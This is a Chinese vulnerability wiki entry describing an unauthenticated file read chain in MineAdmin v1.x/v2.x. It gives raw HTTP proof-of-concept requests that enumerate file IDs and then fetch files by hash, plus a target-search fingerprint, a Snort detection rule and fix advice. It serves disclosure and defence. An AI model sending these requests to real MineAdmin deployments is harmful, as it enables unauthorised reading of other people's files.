---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "MineAdmin getFileInfoById元数据到附件下载链"
product: "MineAdmin"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "v1.x/v2.x；哈希有效/附件访问条件"
prerequisites: "无Cookie样例"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/MineAdmin%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/MineAdmin%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FgetFileInfoById%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
id: "vw-867d5c07a1edeb173b5af780"
entity_id: "ve-867d5c07a1edeb173b5af780"
schema_version: "1"
---

# MineAdmin getFileInfoById元数据到附件下载链

## 条目说明

- 对象与具体问题：MineAdmin；getFileInfoById元数据到附件下载链
- 版本、配置及部署条件：v1.x/v2.x；哈希有效/附件访问条件
- 认证与权限前提：无Cookie样例
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 接口本身返回hash非文件内容，showFile/downloadByHash需分别记录权限边界
- 固定示例hash来源未解释，Snort正常请求即告警误报高；缺版本补丁

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

MineAdmin官网：https://doc.mineadmin.com/

资产测绘语法：body="MineAdmin"

## 影响版本

MineAdmin v1.x
MineAdmin v2.x

## **漏洞描述:** 

MineAdmin后台管理系统基于 Hyperf 框架开发。是一个后台权限管理系统，提供完善的权限体系，让开发者把注意力集中到具体业务当中，降低开发成本，提高项目效率。/system/getFileInfoById?id=处存在任意文件读取漏洞，由于文件 ID 是自增数字，攻击者可通过枚举 ID 读取文件hash,利用/system/showFile接口预览或者利用/system/downloadByHash下载文件。

## 漏洞复现

POC/EXP：

```http
GET /system/getFileInfoById?id=43 HTTP/1.1
Host: 127.0.0.1:9501
```

![image-20260108160222524](./.resource/MineAdmin企业级后台管理系统getFileInfoById任意文件读取漏洞/media/image-20260108160222524.png)


POC/EXP：

```
hash读取接口poc:
/system/showFile/e10adc3949ba59abbe56e057f20f883e
hash下载接口poc:
/system/downloadByHash?hash=e10adc3949ba59abbe56e057f20f883e
```

![image-20260108160341173](./.resource/MineAdmin企业级后台管理系统getFileInfoById任意文件读取漏洞/media/image-20260108160341173.png)


sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"MineAdmin - Arbitrary File Read via getFileInfoById";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri; content:"/system/getFileInfoById";
    http.uri; content:"id=";
    metadata:
        service http,
        affected_product "MineAdmin企业级后台管理系统",
        vulnerability_type "Arbitrary File Read",
        severity "high";
    classtype:web-application-attack;
    sid:1000577;
    rev:1;
    priority:1;
)
```


## 漏洞修复

1./system/getFileInfoById?id=1接口、/system/showFile/接口、/system/downloadByHash?hash=,接口处加强权限校验。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
